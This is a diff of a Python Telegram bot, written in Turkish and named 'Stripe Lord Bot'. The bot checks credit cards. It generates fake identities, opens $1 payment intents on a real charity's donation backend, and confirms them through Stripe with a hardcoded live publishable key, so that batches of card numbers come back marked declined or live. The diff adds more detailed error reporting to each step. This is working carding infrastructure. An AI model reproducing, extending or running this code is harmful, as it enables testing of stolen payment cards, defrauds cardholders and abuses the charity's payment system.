@@ -1,5 +1,5 @@
-# --- DOSYA: main.py (Stripe Lord Bot v1.0 - FINAL) ---
-# SADECE STRIPE CHECKER İLE ÇALIŞAN, SIFIRDAN İNŞA EDİLMİŞ BOT.
+# --- DOSYA: main.py (Stripe Lord Bot v2 - Hata Tespiti) ---
+# StripeChecker daha detaylı hata raporu verecek şekilde güncellendi.
 
 import logging, requests, time, os, re, json, io
 from urllib.parse import quote
@@ -12,7 +12,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from telegram.constants import ParseMode
 from telegram.error import Forbidden, BadRequest
 
-# --- BÖLÜM 1: NÖBETÇİ KULÜBESİ (7/24 İÇİN) ---
+# --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
 app = Flask('')
 @app.route('/')
 def home(): return "Stripe Lord Bot Karargahı ayakta."
@@ -23,16 +23,16 @@ def keep_alive(): Thread(target=run_flask).start()
 try:
     from bot_token import TELEGRAM_TOKEN, ADMIN_ID
 except ImportError:
-    print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı veya bilgileri eksik!"); exit()
+    print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()
 
 # -----------------------------------------------------------------------------
-# 3. BİRİM: İSTİHBARAT & OPERASYON (Stripe Özel Harekat)
+# 3. BİRİM: İSTİHBARAT & OPERASYON (Stripe Özel Harekat - GÜNCELLENDİ)
 # -----------------------------------------------------------------------------
 class StripeChecker:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'})
-        self.pk_live = "pk_live_B3imPhpDAew8RzuhaKclN4Kd" # Bu plandan gelen anahtar
+        self.pk_live = "pk_live_B3imPhpDAew8RzuhaKclN4Kd"
         self.donation_url = "https://www-backend.givedirectly.org/payment-intent"
         self.timeout = 30
 
@@ -42,28 +42,41 @@ class StripeChecker:
             if len(parts) < 4: return "❌ HATA: Eksik kart bilgisi. Format: NUMARA|AY|YIL|CVC"
             ccn, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
 
-            user_res = self.session.get("https://randomuser.me/api?nat=us", timeout=10)
-            user_data = user_res.json()['results'][0]
-            first_name, last_name = user_data['name']['first'], user_data['name']['last']
-            email = f"{first_name}.{last_name}{time.time()}@yahoo.com"
+            # --- Adım 1: Sahte Kullanıcı Bilgisi Al ---
+            try:
+                user_res = self.session.get("https://randomuser.me/api?nat=us", timeout=10)
+                user_res.raise_for_status()
+                user_data = user_res.json()['results'][0]
+                first_name, last_name = user_data['name']['first'], user_data['name']['last']
+                email = f"{first_name}.{last_name}{time.time()}@yahoo.com"
+            except Exception as e:
+                return f"❌ HATA (Adım 1 - randomuser): {e}"
 
-            intent_payload = {"cents": 100, "frequency": "once"} # 1 Dolar'lık test
-            intent_res = self.session.post(self.donation_url, json=intent_payload, timeout=self.timeout)
-            intent_data = intent_res.json()
-            client_secret = intent_data.get('clientSecret')
-
-            if not client_secret: return "❌ HATA: Ödeme niyeti oluşturulamadı."
+            # --- Adım 2: Ödeme Niyeti Oluştur ---
+            try:
+                intent_payload = {"cents": 100, "frequency": "once"}
+                intent_res = self.session.post(self.donation_url, json=intent_payload, timeout=15)
+                intent_res.raise_for_status()
+                intent_data = intent_res.json()
+                client_secret = intent_data.get('clientSecret')
+                if not client_secret: return "❌ HATA (Adım 2 - givedirectly): 'client_secret' alınamadı."
+            except Exception as e:
+                 return f"❌ HATA (Adım 2 - givedirectly): {e}"
 
             payment_intent_id = client_secret.split('_secret_')[0]
-            stripe_url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
             
-            payload_data = f'payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={month}&payment_method_data[card][exp_year]={year}&payment_method_data[billing_details][name]={first_name}+{last_name}&payment_method_data[billing_details][email]={quote(email)}&client_secret={client_secret}'
-            
-            headers = {'Authorization': f'Bearer {self.pk_live}', 'Content-Type': 'application/x-www-form-urlencoded'}
-            
-            confirm_res = self.session.post(stripe_url, headers=headers, data=payload_data, timeout=self.timeout)
-            confirm_data = confirm_res.json()
+            # --- Adım 3: Stripe'a Onaylama İsteği Gönder ---
+            try:
+                stripe_url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
+                payload_data = f'payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={month}&payment_method_data[card][exp_year]={year}&payment_method_data[billing_details][name]={first_name}+{last_name}&payment_method_data[billing_details][email]={quote(email)}&client_secret={client_secret}'
+                headers = {'Authorization': f'Bearer {self.pk_live}', 'Content-Type': 'application/x-www-form-urlencoded'}
+                
+                confirm_res = self.session.post(stripe_url, headers=headers, data=payload_data, timeout=self.timeout)
+                confirm_data = confirm_res.json()
+            except Exception as e:
+                return f"❌ HATA (Adım 3 - stripe): {e}"
 
+            # --- Adım 4: Sonucu Yorumla ---
             if 'error' in confirm_data:
                 error_msg = confirm_data['error'].get('message', 'Bilinmeyen Stripe Hatası')
                 return f"❌ Declined: {error_msg}"
@@ -75,10 +88,10 @@ class StripeChecker:
                 return f"❓ Bilinmeyen Sonuç: {confirm_data.get('status', 'No Status')}"
 
         except Exception as e:
-            return f"❌ KRİTİK HATA: {e}"
+            return f"❌ BEKLENMEDİK KRİTİK HATA: {e}"
 
 # -----------------------------------------------------------------------------
-# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
+# ... (Geri kalan bütün kodlar, UserManager ve tüm handler'lar aynı kalacak) ...
 # -----------------------------------------------------------------------------
 class UserManager:
     def __init__(self, initial_admin_id):
@@ -115,9 +128,6 @@ class UserManager:
             self.activated_admins[str(user_id)] = key; self.unused_admin_keys.remove(key); self._save_all_data(); return "Success"
         return "Geçersiz veya kullanılmış Vezir Fermanı."
 
-# -----------------------------------------------------------------------------
-# 5. BİRİM: EMİR SUBAYLARI (Handlers)
-# -----------------------------------------------------------------------------
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 def log_activity(user: User, card: str, result: str):
     masked_card = re.sub(r'(\d{6})\d{6}(\d{4})', r'\1******\2', card.split('|')[0]) + '|' + '|'.join(card.split('|')[1:])
@@ -130,7 +140,7 @@ async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
     report_content = "";
     for card in cards:
         result = site_checker.check_card(card); log_activity(user, card, result)
-        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1) # Stripe için bekleme süresi 1 saniye olsun
+        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1)
     report_file = io.BytesIO(report_content.encode('utf-8'))
     await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Raporun hazır.")
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -229,7 +239,7 @@ def main():
     keep_alive()
     stripe_checker = StripeChecker()
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Stripe Lord Bot (v1.0) aktif...")
+    print("Stripe Lord Bot (v2 - Hata Tespiti) aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     application.bot_data['stripe_checker'] = stripe_checker
     application.bot_data['user_manager'] = user_manager_instance
